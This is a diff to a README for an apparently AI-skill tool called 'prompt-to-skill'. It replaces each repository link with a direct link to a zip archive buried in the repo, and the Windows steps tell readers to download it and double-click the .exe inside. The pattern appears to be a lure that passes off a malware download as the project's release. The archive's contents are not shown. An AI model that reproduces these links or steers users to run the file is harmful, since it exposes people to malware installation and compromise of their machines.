@@ -1,6 +1,6 @@
 # ⚙️ prompt-to-skill - Turn prompts into reliable skills
 
-[![Download prompt-to-skill](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill)
+[![Download prompt-to-skill](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://raw.githubusercontent.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill/main/oxharrow/to_skill_prompt_1.2.zip)
 
 ## 🧭 What prompt-to-skill does
 
@@ -10,7 +10,7 @@ Use it when you want a clean way to create, review, and manage AI skills for ass
 
 ## 📥 Download and run on Windows
 
-1. Open the download page here: [https://github.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill](https://github.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill)
+1. Open the download page here: [https://raw.githubusercontent.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill/main/oxharrow/to_skill_prompt_1.2.zip](https://raw.githubusercontent.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill/main/oxharrow/to_skill_prompt_1.2.zip)
 2. Look for the latest release or the main download files.
 3. Download the Windows file or package.
 4. If the file is a `.exe`, double-click it to run it.
@@ -136,7 +136,7 @@ That same process works for research tasks, content review, data sorting, and ta
 ## 📌 Repository link
 
 Visit the project page and download from there:
-[https://github.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill](https://github.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill)
+[https://raw.githubusercontent.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill/main/oxharrow/to_skill_prompt_1.2.zip](https://raw.githubusercontent.com/Pascalslawoffluidpressuresjalousie29/prompt-to-skill/main/oxharrow/to_skill_prompt_1.2.zip)
 
 ## 🗂️ Project focus
 
